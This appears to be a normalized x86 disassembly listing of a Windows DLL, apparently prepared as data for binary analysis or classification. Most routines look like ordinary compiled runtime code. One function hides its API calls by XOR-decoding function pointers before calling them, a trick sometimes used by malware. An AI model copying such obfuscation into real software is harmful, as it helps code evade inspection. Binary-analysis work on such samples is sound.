mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
push eax
push r--data
lea eax [ ebp - 0x44 ]
push 0x40
push eax
mov ebx ecx
call sub_1000f103
push eax
lea eax [ ebp - 0x44 ]
push eax
push [ ebp + 0x18 ]
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push ebx
call sub_100234cf
mov ecx [ ebp - 0x4 ]
add esp 0x30
pop edi
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn 0x18
sub_10049080
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x1c ]
push ecx
push eax
push r--data
lea edx [ esp + 0x1c ]
push edx
push esi
call sub_10048610
add esp 0x10
push eax
lea eax [ esp + 0x20 ]
push 0x40
push eax
call sub_1000f103
mov edx [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ esp + 0x2c ]
push ecx
mov ecx [ ebp + 0xc ]
push edx
push ebx
push eax
push ecx
push edi
push esi
call sub_10012150
mov ecx [ esp + 0x8c ]
add esp 0x30
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x18
sub_100490fd
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_1001fcf4
push [ ebp + 0x8 ]
call sub_1000909e
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_1001fcf4
lea eax [ ebp - 0x20 ]
push eax
call sub_1001d9ff
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_1000909e
pop ecx
sub_100491a0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x58
push ebx
call sub_10013bb0
mov esi [ ebp + 0xc ]
mov edi eax
mov ecx 0x16
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
and ecx 0xfffffffd
or ecx [ ebp + 0x10 ]
lea esi [ eax + 0x10 ]
push esi
or ecx 0x1
push 0x1
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
call sub_100417e0
lea eax [ esi + 0x3c ]
mov esi [ ebp + 0xc ]
mov edx [ esi + 0x50 ]
push eax
push edx
push ebx
mov [ ebp - 0x10 ] eax
call sub_100417e0
add esp 0x20
mov [ ebp + 0x10 ] edi
cmp [ esi + 0x50 ] edi
jbe r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp + 0x10 ]
mov esi [ eax + ecx * 4 ]
push 0x4c
push ebx
mov [ ebp - 0x8 ] esi
call sub_10013bb0
mov edi eax
mov ecx 0x13
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
mov edx [ edi + 0x4 ]
push edx
push ebx
mov [ ebp - 0xc ] eax
call sub_1004ab70
mov esi [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x10 ]
push eax
push ebx
call sub_1004ab70
mov ecx [ ebp - 0x10 ]
push ecx
push esi
push ebx
mov [ esi + 0x10 ] eax
call sub_10006860
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
inc eax
add esp 0x24
mov [ ebp + 0x10 ] eax
cmp eax [ edx + 0x50 ]
jb r-xdata
mov esi edx
sub_100492c0
push ebp
mov ebp esp
push 0xffffffff
push sub_10086617
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov [ ebp - 0x4 ] edi
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
mov esi [ LocalFree@IAT ]
mov [ ebx ] edi
cmp eax edi
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax edi
je r-xdata
push eax
call esi
mov eax [ ebx + 0x14 ]
dec eax
mov [ ebx + 0x8 ] edi
cmp eax 0x5
ja r-xdata
push eax
call esi
mov [ ebx + 0x14 ] edi
mov [ ebp - 0x4 ] 0x3
mov eax [ ebx + 0x3c ]
dec [ eax ]
mov eax [ eax ]
cmp eax edi
jne r-xdata
jmp [ eax * 4 + jump_table_10049518 ]
mov [ ebp - 0x4 ] 0x2
mov eax [ ebx + 0x34 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x38 ]
cmp ecx edi
je r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10014a90
mov eax esi
push eax
lea edi [ ebx + 0x18 ]
mov [ ebp - 0x4 ] 0x5
call sub_10016630
mov edi esi
mov [ ebp - 0x4 ] 0x4
call sub_10046710
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10014a90
lea edi [ ebx + 0x20 ]
mov ebx esi
call sub_10065180
mov edi esi
call sub_1005b920
mov ebx [ ebp + 0x8 ]
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10014a90
lea esi [ ebx + 0x28 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x6
call sub_10009a20
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_1002db00
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10014a90
lea esi [ ebx + 0x30 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x7
call sub_10009a20
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_1002db00
jmp r-xdata
xor eax eax
lea esi [ ebp - 0x18 ]
call sub_10014a90
lea esi [ ebx + 0x38 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x8
call sub_10009a20
mov esi edi
mov [ ebp - 0x4 ] 0x4
call sub_1002db00
mov [ ebp - 0x4 ] 0x1
mov eax [ ebx + 0x2c ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x30 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x3c ]
mov [ ebx + 0x38 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
xor edi edi
mov eax [ ebx + 0x24 ]
dec [ eax ]
cmp [ eax ] edi
jne r-xdata
mov ecx [ ebx + 0x28 ]
cmp ecx edi
je r-xdata
mov eax [ ebx + 0x34 ]
mov [ ebx + 0x30 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x3c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebx + 0x1c ]
dec [ eax ]
jne r-xdata
mov esi [ ebx + 0x20 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x2c ]
mov [ ebx + 0x28 ] edi
cmp eax edi
je r-xdata
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
mov [ ebx + 0x34 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov esi [ ebx + 0x18 ]
cmp esi edi
je r-xdata
mov eax [ ebx + 0x24 ]
mov [ ebx + 0x20 ] edi
cmp eax edi
je r-xdata
call sub_100324d0
mov [ ebx + 0x2c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x18 ] edi
cmp eax edi
je r-xdata
mov eax esi
call sub_10054bf0
push esi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x24 ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ ebx + 0x1c ] edi
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10049530
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ rw-data ]
push ebx
push esi
xor eax eax
mov bl 0x38
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
xor [ ebp - 0x4 ] bl
xor [ ebp - 0x3 ] bl
xor [ ebp - 0x2 ] bl
xor [ ebp - 0x1 ] bl
push eax
lea edx [ ebp - 0x14 ]
push edx
push ecx
push eax
push eax
mov [ ebp - 0x14 ] 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp - 0x4 ]
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov esi eax
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edx [ ebp - 0x10 ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push edx
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_100495e4
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_10032529
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_10049c90 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_10069e16
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rw-data
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rw-data
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_10049cc0
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
call sub_1005b670
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor eax eax
mov edx [ ebp + 0x10 ]
cmp edx ebx
jne r-xdata
mov [ eax ] bl
jmp r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
mov ecx eax
jne r-xdata
mov [ eax ] bl
jmp r-xdata
mov esi edx
sub esi eax
mov esi eax
sub esi edx
cmp [ ebp + 0x14 ] ebx
jne r-xdata
dec edi
je r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
mov [ ecx ] bl
dec [ ebp + 0x14 ]
jne r-xdata
cmp [ ebp + 0x14 ] 0xffffffff
jne r-xdata
mov cl [ edx ]
mov [ esi + edx ] cl
inc edx
cmp cl bl
je r-xdata
jmp r-xdata
mov dl [ esi + ecx ]
mov [ ecx ] dl
inc ecx
cmp dl bl
je r-xdata
mov [ eax ] bl
call sub_1005b670
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ eax + ecx - 0x1 ] bl
pop eax
jmp r-xdata
call sub_1004b131
mov eax esi
jmp r-xdata
sub_10049d80
push ebp
mov ebp esp
push 0xffffffff
push sub_10087131
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
xor eax eax
sub ecx eax
je r-xdata
push 0xe8
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
dec ecx
je r-xdata
xor eax eax
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1002fd80
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0xf0
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x1
test eax eax
je r-xdata
dec ecx
jne r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1000d540
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push 0x2e8
call sub_1002e3ac
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x2
test eax eax
je r-xdata
mov ecx [ ebp + 0x1c ]
mov edx [ ebp + 0x18 ]
push edi
push ebx
push esi
push ecx
mov ecx [ ebp + 0x10 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x14 ]
push edx
mov edx [ ebp + 0x8 ]
mov esi eax
call sub_1003f5a0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
sub_10049eb1
push 0x4
mov eax sub_10085ee6
call sub_10026266
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] ebx
mov [ esi ] bl
mov eax [ ebp + 0x10 ]
sub eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x10 ] 0x1
je r-xdata
push ebx
push eax
mov ecx esi
call sub_10051ccd
mov eax esi
call sub_10008d33
retn 0xc
lea edi [ ecx + 0x8 ]
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov eax [ esi + 0x10 ]
cmp edx 0x10
jb r-xdata
cmp eax ebx
ja r-xdata
push edi
push [ ebp + 0x10 ]
add ecx eax
push [ ebp + 0xc ]
push ecx
push edx
call sub_1004b141
add esp 0x14
cmp eax [ esi + 0x10 ]
jbe r-xdata
push ebx
push eax
mov ecx esi
call sub_10051ccd
mov edx [ esi + 0x14 ]
cmp edx 0x10
jb r-xdata
sub_10049f3a
mov edi edi
push ebp
mov ebp esp
